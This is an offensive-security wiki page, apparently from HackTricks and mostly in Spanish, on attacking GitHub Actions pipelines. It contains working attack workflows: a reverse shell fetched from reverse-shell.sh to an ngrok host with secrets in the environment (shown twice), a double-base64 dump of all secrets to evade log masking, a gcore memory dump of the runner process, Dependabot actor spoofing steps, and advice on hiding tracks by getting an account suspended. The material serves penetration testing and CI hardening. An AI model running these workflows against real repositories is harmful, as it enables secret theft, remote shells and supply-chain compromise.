# Abusing Github Actions

{{#include ../../../banners/hacktricks-training.md}}

## Tools

Las siguientes herramientas son útiles para encontrar workflows de Github Action e incluso localizar ones vulnerables:

- [https://github.com/CycodeLabs/raven](https://github.com/CycodeLabs/raven)
- [https://github.com/praetorian-inc/gato](https://github.com/praetorian-inc/gato)
- [https://github.com/AdnaneKhan/Gato-X](https://github.com/AdnaneKhan/Gato-X)
- [https://github.com/carlospolop/PurplePanda](https://github.com/carlospolop/PurplePanda)
- [https://github.com/zizmorcore/zizmor](https://github.com/zizmorcore/zizmor) - Revisa también su checklist en [https://docs.zizmor.sh/audits](https://docs.zizmor.sh/audits)

## Basic Information

En esta página encontrarás:

- Un **resumen de todos los impactos** que puede tener un atacante que logre acceder a una Github Action
- Diferentes maneras de **obtener acceso a una action**:
- Tener **permisos** para crear la action
- Abusar de triggers relacionados con **pull request**
- Abusar de **otras técnicas de acceso externo**
- **Pivotar** desde un repo ya comprometido
- Finalmente, una sección sobre **técnicas de post-explotación para abusar una action desde dentro** (y provocar los impactos mencionados)

## Impacts Summary

Para una introducción sobre [**Github Actions check the basic information**](../basic-github-information.md#github-actions).

Si puedes **ejecutar código arbitrario en GitHub Actions** dentro de un **repository**, podrías:

- **Robar secrets** montados en el pipeline y **abusar de los privilegios del pipeline** para obtener acceso no autorizado a plataformas externas, como AWS and GCP.
- **Comprometer deployments** y otros **artifacts**.
- Si el pipeline despliega o almacena assets, podrías alterar el producto final, permitiendo un ataque a la supply chain.
- **Ejecutar código en custom workers** para abusar de potencia de cómputo y pivotar a otros sistemas.
- **Sobrescribir el código del repository**, dependiendo de los permisos asociados con el `GITHUB_TOKEN`.

## GITHUB_TOKEN

This "**secret**" (coming from `${{ secrets.GITHUB_TOKEN }}` and `${{ github.token }}`) is given when the admin enables this option:

<figure><img src="../../../images/image (86).png" alt=""><figcaption></figcaption></figure>

This token is the same one a **Github Application will use**, so it can access the same endpoints: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

> [!WARNING]
> Github should release a [**flow**](https://github.com/github/roadmap/issues/74) that **allows cross-repository** access within GitHub, so a repo can access other internal repos using the `GITHUB_TOKEN`.

Puedes ver los posibles **permissions** de este token en: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token)

Ten en cuenta que el token **expira después de que el job ha terminado**.\
Estos tokens se ven así: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

Algunas cosas interesantes que puedes hacer con este token:

{{#tabs }}
{{#tab name="Merge PR" }}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header "content-type: application/json" \
-d "{\"commit_title\":\"commit_title\"}"
```
{{#endtab }}
{{#tab name="Approve PR" }}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{{#endtab }}
{{#tab name="Create PR" }}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{{#endtab }}
{{#endtabs }}

> [!CAUTION]
> Ten en cuenta que en varias ocasiones podrás encontrar **github user tokens inside Github Actions envs or in the secrets**. Estos tokens pueden darte más privilegios sobre el repositorio y la organización.

<details>

<summary>Listar secrets en la salida de Github Action</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Obtener reverse shell con secrets</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

Es posible comprobar los permisos otorgados a un Github Token en repositorios de otros usuarios comprobando los logs de las Github actions:

<figure><img src="../../../images/image (286).png" alt="" width="269"><figcaption></figcaption></figure>

## Ejecución permitida

> [!NOTE]
> Esta sería la forma más fácil de comprometer Github actions, ya que este caso supone que tienes acceso para **crear un nuevo repo en la organización**, o tienes **privilegios de escritura sobre un repositorio**.
>
> Si estás en este escenario puedes revisar las [Post Exploitation techniques](#post-exploitation-techniques-from-inside-an-action).

### Ejecución desde la creación del repo

En caso de que miembros de una organización puedan **create new repos** y puedas ejecutar Github actions, puedes **create a new repo and steal the secrets set at organization level**.

### Ejecución desde una nueva rama

Si puedes **create a new branch in a repository that already contains a Github Action** configurado, puedes **modificarlo**, **subir** el contenido y luego **ejecutar esa Github Action desde la nueva rama**. De esta manera puedes **exfiltrar secrets a nivel de repositorio y organización** (pero necesitas saber cómo se llaman).

> [!WARNING]
> Any restriction implemented only inside workflow YAML (for example, `on: push: branches: [main]`, job conditionals, or manual gates) can be edited by collaborators. Without external enforcement (branch protections, protected environments, and protected tags), a contributor can retarget a workflow to run on their branch and abuse mounted secrets/permissions.

Puedes hacer que la Github Action modificada sea ejecutable **manualmente**, cuando se **crea un PR** o cuando se **hace push de código** (dependiendo de cuánto ruido quieras generar):
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name
# Use '**' instead of a branh name to trigger the action in all the cranches
```
---

## Ejecución forkeada

> [!NOTE]
> Existen diferentes triggers que podrían permitir a un atacante **execute a Github Action of another repository**. Si esas acciones triggerables están mal configuradas, un atacante podría comprometerlas.

### `pull_request`

El trigger de workflow **`pull_request`** ejecutará el workflow cada vez que se recibe un pull request con algunas excepciones: por defecto, si es la **primera vez** que estás **colaborando**, algún **mantenedor** tendrá que **aprobar** la **run** del workflow:

<figure><img src="../../../images/image (184).png" alt=""><figcaption></figcaption></figure>

> [!NOTE]
> Como la **limitación por defecto** es para **contribuidores de primera vez**, podrías contribuir **corrigiendo un bug/typo válido** y luego enviar **otros PRs para abusar de tus nuevos privilegios `pull_request`**.
>
> **Lo probé y no funciona**: ~~Otra opción sería crear una cuenta con el nombre de alguien que contribuyó al proyecto y eliminar su cuenta.~~

Además, por defecto **impide write permissions** y **secrets access** al repositorio objetivo como se menciona en los [**docs**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories):

> With the exception of `GITHUB_TOKEN`, **secrets are not passed to the runner** when a workflow is triggered from a **forked** repository. The **`GITHUB_TOKEN` has read-only permissions** in pull requests **from forked repositories**.

Un atacante podría modificar la definición de la Github Action para ejecutar cosas arbitrarias y añadir acciones arbitrarias. Sin embargo, no podrá robar secrets ni sobrescribir el repo debido a las limitaciones mencionadas.

> [!CAUTION]
> **Sí, si el atacante cambia en el PR la github action que será triggered, su Github Action será la que se use y no la del repo de origen!**

Como el atacante también controla el código que se ejecuta, aun si no hay secrets o write permissions en el `GITHUB_TOKEN`, un atacante podría por ejemplo **upload malicious artifacts**.

### **`pull_request_target`**

El trigger de workflow **`pull_request_target`** tiene **write permission** al repositorio objetivo y **access to secrets** (y no pide permiso).

Ten en cuenta que el trigger de workflow **`pull_request_target`** **runs in the base context** y no en el que aporta el PR (para **no ejecutar código no confiable**). Para más info sobre `pull_request_target` [**check the docs**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull_request_target).\
Además, para más info sobre este uso específico peligroso revisa este [**github blog post**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/).

Podría parecer que, dado que el **executed workflow** es el que está definido en la **base** y **no en el PR**, es **secure** usar **`pull_request_target`**, pero hay **algunos casos en los que no lo es**.

Y este tendrá **access to secrets**.

### `workflow_run`

El [**workflow_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow_run) trigger permite ejecutar un workflow desde otro cuando está `completed`, `requested` o `in_progress`.

En este ejemplo, un workflow está configurado para ejecutarse después de que el workflow separado "Run Tests" completes:
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
Además, según la documentación: El workflow iniciado por el evento `workflow_run` puede **access secrets and write tokens, even if the previous workflow was not**.

Este tipo de workflow podría ser atacado si está **depending** de un **workflow** que puede ser **triggered** por un usuario externo vía **`pull_request`** o **`pull_request_target`**. Un par de ejemplos vulnerables se pueden [**found this blog**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability)**.** El primero consiste en que el workflow activado por **`workflow_run`** descarga el código del atacante: `${{ github.event.pull_request.head.sha }}`\
El segundo consiste en **passing** un **artifact** del código **untrusted** al workflow **`workflow_run`** y usar el contenido de ese artifact de una manera que lo hace **vulnerable to RCE**.

### `workflow_call`

TODO

TODO: Comprobar si cuando se ejecuta desde un pull_request el código usado/descargado es el del origin o el del forked PR

## Abusing Forked Execution

Hemos mencionado todas las formas en que un atacante externo podría lograr que un workflow de GitHub se ejecute; ahora veamos cómo estas ejecuciones, si están mal configuradas, podrían ser abusadas:

### Untrusted checkout execution

En el caso de **`pull_request`,** el workflow se va a ejecutar en el **context of the PR** (así que ejecutará el **malicious PRs code**), pero alguien necesita **autorizarlo primero** y se ejecutará con algunas [limitations](#pull_request).

En el caso de un workflow que usa **`pull_request_target` or `workflow_run`** que depende de un workflow que puede ser triggerado desde **`pull_request_target` or `pull_request`**, se ejecutará el código del repositorio original, por lo que el **attacker cannot control the executed code**.

> [!CAUTION]
> Sin embargo, si la **action** tiene un **explicit PR checkou**t que va a **get the code from the PR** (y no desde base), usará el código controlado por el atacante. Por ejemplo (revisa la línea 12 donde se descarga el código del PR):

<pre class="language-yaml"><code class="lang-yaml"># INSECURE. Provided as an example only.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
</code></pre>

El potencial **untrusted code se está ejecutando durante `npm install` o `npm build`** ya que los build scripts y los **packages** referenciados están controlados por el autor del PR.

> [!WARNING]
> Un github dork para buscar actions vulnerables es: `event.pull_request pull_request_target extension:yml` sin embargo, hay diferentes formas de configurar los jobs para que se ejecuten de forma segura incluso si la action está configurada de forma insegura (por ejemplo usando condicionales sobre quién es el actor que genera el PR).

### Context Script Injections <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

Ten en cuenta que hay ciertos [**github contexts**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context) cuyos valores están **controlled** por el **user** que crea el PR. Si la github action está usando esos **data to execute anything**, podría llevar a **arbitrary code execution:**

{{#ref}}
gh-actions-context-script-injections.md
{{#endref}}

### **GITHUB_ENV Script Injection** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

Según la documentación: Puedes hacer que una **environment variable esté disponible para cualquier step subsecuente** en un job de workflow definiendo o actualizando la variable de entorno y escribiéndola en el fichero de entorno **`GITHUB_ENV`**.

Si un atacante pudiera **inject any value** dentro de esta variable **env**, podría inyectar variables de entorno que podrían ejecutar código en pasos siguientes como **LD_PRELOAD** o **NODE_OPTIONS**.

Por ejemplo ([**this**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) y [**this**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)), imagina un workflow que confía en un artifact subido para almacenar su contenido dentro de la variable `GITHUB_ENV`. Un atacante podría subir algo como esto para comprometerlo:

<figure><img src="../../../images/image (261).png" alt=""><figcaption></figcaption></figure>

### Dependabot and other trusted bots

Como se indica en [**this blog post**](https://boostsecurity.io/blog/weaponizing-dependabot-pwn-request-at-its-finest), varias organizaciones tienen una GitHub Action que mergea cualquier PRR de `dependabot[bot]` como en:
```yaml
on: pull_request_target
jobs:
auto-merge:
runs-on: ubuntu-latest
if: ${ { github.actor == 'dependabot[bot]' }}
steps:
- run: gh pr merge $ -d -m
```
Esto es un problema porque el campo `github.actor` contiene el usuario que causó el último evento que desencadenó el workflow. Y hay varias formas de hacer que el usuario `dependabot[bot]` modifique un PR. Por ejemplo:

- Fork the victim repository
- Add the malicious payload to your copy
- Enable Dependabot on your fork adding an outdated dependency. Dependabot will create a branch fixing the dependency with malicious code.
- Open a Pull Request to the victim repository from that branch (the PR will be created by the user so nothing will happen yet)
- Then, attacker goes back to the initial PR Dependabot opened in his fork and runs `@dependabot recreate`
- Then, Dependabot perform some actions in that branch, that modified the PR over the victim repo, which makes `dependabot[bot]` the actor of the latest event that triggered the workflow (and therefore, the workflow runs).

Avanzando, ¿qué pasa si, en lugar de hacer merge, la Github Action tuviera una command injection como en:
```yaml
on: pull_request_target
jobs:
just-printing-stuff:
runs-on: ubuntu-latest
if: ${ { github.actor == 'dependabot[bot]' }}
steps:
- run: echo ${ { github.event.pull_request.head.ref }}
```
La entrada del blog original propone dos opciones para abusar de este comportamiento; la segunda es:

- Fork el repositorio de la víctima y habilitar Dependabot con alguna dependencia desactualizada.
- Crear una nueva branch con el código malicioso de shell injection.
- Cambiar la default branch del repositorio a esa.
- Crear un PR desde esta branch al repositorio de la víctima.
- Ejecutar `@dependabot merge` en el PR que Dependabot abrió en su fork.
- Dependabot fusionará sus cambios en la default branch de tu repositorio forked, actualizando el PR en el repositorio de la víctima, haciendo ahora que `dependabot[bot]` sea el actor del último evento que disparó el workflow y usando un nombre de branch malicioso.

### Vulnerable Third Party Github Actions

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

As mentioned in [**this blog post**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks), this Github Action allows to access artifacts from different workflows and even repositories.

El problema es que si el parámetro **`path`** no está establecido, el artifact se extrae en el directorio actual y puede sobrescribir archivos que podrían ser usados más tarde o incluso ejecutados en el workflow. Por lo tanto, si el Artifact es vulnerable, un atacante podría abusar de esto para comprometer otros workflows que confían en el Artifact.

Example of vulnerable workflow:
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
Esto podría ser atacado con este flujo de trabajo:
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
---

## Other External Access

### Deleted Namespace Repo Hijacking

Si una cuenta cambia su nombre, otro usuario podría registrar una cuenta con ese nombre después de algún tiempo. Si un repo tenía **menos de 100 stars antes del cambio de name**, Github permitirá que el nuevo usuario registrado con el mismo nombre cree un **repo con el mismo name** que el eliminado.

> [!CAUTION]
> Por lo tanto, si una action está usando un repo de una cuenta inexistente, todavía es posible que un atacante cree esa cuenta y comprometa la action.

Si otros repos estaban usando **dependencies from this user repos**, un atacante podrá secuestrarlos. Aquí tienes una explicación más completa: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

---

## Repo Pivoting

> [!NOTE]
> En esta sección hablaremos de técnicas que permitirían **pivot from one repo to another** suponiendo que tenemos algún tipo de acceso al primero (revisa la sección anterior).

### Cache Poisoning

Se mantiene un cache entre **workflow runs in the same branch**. Esto significa que si un atacante logra **compromise** un **package** que luego se almacena en el cache y es **downloaded** y ejecutado por un workflow **more privileged**, también podrá **compromise** ese workflow.

{{#ref}}
gh-actions-cache-poisoning.md
{{#endref}}

### Artifact Poisoning

Los workflows podrían usar **artifacts from other workflows and even repos**; si un atacante consigue **compromise** la Github Action que **uploads an artifact** que luego es usada por otro workflow, podría **compromise the other workflows**:

{{#ref}}
gh-actions-artifact-poisoning.md
{{#endref}}

---

## Post Exploitation from an Action

### Github Action Policies Bypass

Como se comenta en [**this blog post**](https://blog.yossarian.net/2025/06/11/github-actions-policies-dumb-bypass), incluso si un repo u organización tiene una policy que restringe el uso de ciertas actions, un atacante podría simplemente descargar (`git clone`) una action dentro del workflow y luego referenciarla como una local action. Como las policies no afectan los local paths, **la action se ejecutará sin ninguna restricción.**

Example:
```yaml
on: [push, pull_request]

jobs:
test:
runs-on: ubuntu-latest
steps:
- run: |
mkdir -p ./tmp
git clone https://github.com/actions/checkout.git ./tmp/checkout

- uses: ./tmp/checkout
with:
repository: woodruffw/gha-hazmat
path: gha-hazmat

- run: ls && pwd

- run: ls tmp/checkout
```
### Accediendo a AWS y GCP vía OIDC

Consulta las siguientes páginas:

{{#ref}}
../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md
{{#endref}}

{{#ref}}
../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md
{{#endref}}

### Accediendo a secretos <a href="#accessing-secrets" id="accessing-secrets"></a>

Si estás inyectando contenido en un script, es útil saber cómo puedes acceder a los secretos:

- Si el secreto o token está establecido como una **variable de entorno**, puede accederse directamente a través del entorno usando **`printenv`**.

<details>

<summary>Listar secretos en la salida de Github Action</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Obtener reverse shell con secrets</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

- Si el secret se usa **directamente en una expresión**, el script de shell generado se guarda **en disco** y es accesible.
- ```bash
cat /home/runner/work/_temp/*
```
- Para las acciones de JavaScript, los secrets se envían a través de variables de entorno
- ```bash
ps axe | grep node
```
- Para una **custom action**, el riesgo puede variar dependiendo de cómo un programa esté usando el secret que obtuvo del **argument**:

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

- Enumerar todos los secrets vía el secrets context (nivel collaborator). Un contributor con write access puede modificar un workflow en cualquier branch para volcar todos los repository/org/environment secrets. Usa doble base64 para evadir el enmascaramiento de logs de GitHub y decodifica localmente:

```yaml
name: Steal secrets
on:
push:
branches: [ attacker-branch ]
jobs:
dump:
runs-on: ubuntu-latest
steps:
- name: Double-base64 the secrets context
run: |
echo '${{ toJson(secrets) }}' | base64 -w0 | base64 -w0
```

Decodifica localmente:

```bash
echo "ZXdv...Zz09" | base64 -d | base64 -d
```

Tip: para sigilo durante las pruebas, encripta antes de imprimir (openssl está preinstalado en los GitHub-hosted runners).

### Abusing Self-hosted runners

La forma de encontrar qué **Github Actions are being executed in non-github infrastructure** es buscar **`runs-on: self-hosted`** en el yaml de configuración de Github Action.

**Self-hosted** runners podrían tener acceso a **extra sensitive information**, a otros **network systems** (¿endpoints vulnerables en la red? ¿metadata service?) o, incluso si está aislado y destruido, **más de una action podría ejecutarse al mismo tiempo** y la maliciosa podría **steal the secrets** de la otra.

En self-hosted runners también es posible obtener los **secrets from the \_Runner.Listener**\_\*\* process\*\* que contendrá todos los secrets de los workflows en cualquier paso volcando su memoria:
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
Check [**this post for more information**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/).

### Registro de imágenes Docker en Github

Es posible crear Github actions que **construyan y almacenen un Docker image dentro de Github**.\
Un ejemplo se puede encontrar en el siguiente elemento desplegable:

<details>

<summary>Github Action Build & Push Docker Image</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

Como puedes ver en el código anterior, el registro de Github está alojado en **`ghcr.io`**.

Un usuario con permisos de lectura sobre el repo podrá entonces descargar la Docker Image usando un personal access token:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
Luego, el usuario podría buscar **leaked secrets in the Docker image layers:**

{{#ref}}
https://book.hacktricks.wiki/en/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics.html
{{#endref}}

### Información sensible en los logs de Github Actions

Aunque **Github** intenta **detectar valores secretos** en los logs de Actions y **evitar mostrarlos**, **otros datos sensibles** que podrían haberse generado durante la ejecución de la action no serán ocultados. Por ejemplo, un JWT firmado con un valor secreto no se ocultará a menos que esté [specifically configured](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret).

## Ocultando tus rastros

(Technique from [**here**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)) Primero que nada, cualquier PR creado es claramente visible al público en Github y a la cuenta objetivo en GitHub. En GitHub por defecto, **no podemos eliminar un PR de Internet**, pero hay una vuelta de tuerca. Para cuentas de Github que son **suspendidas** por Github, todos sus **PRs son eliminados automáticamente** y removidos de Internet. Así que, para ocultar tu actividad necesitas o bien conseguir que tu **GitHub account suspended or get your account flagged**. Esto **ocultaría todas tus actividades** en GitHub de Internet (básicamente eliminar todos tus exploit PR)

An organization in GitHub is very proactive in reporting accounts to GitHub. All you need to do is share “some stuff” in Issue and they will make sure your account is suspended in 12 hours :p and there you have, made your exploit invisible on github.

> [!WARNING]
> La única forma de que una organización se dé cuenta de que ha sido objetivo es revisar los logs de GitHub desde SIEM, ya que desde el GitHub UI el PR sería eliminado.

## Referencias

- [GitHub Actions: A Cloudy Day for Security - Part 1](https://binarysecurity.no/posts/2025/08/securing-gh-actions-part1)

{{#include ../../../banners/hacktricks-training.md}}
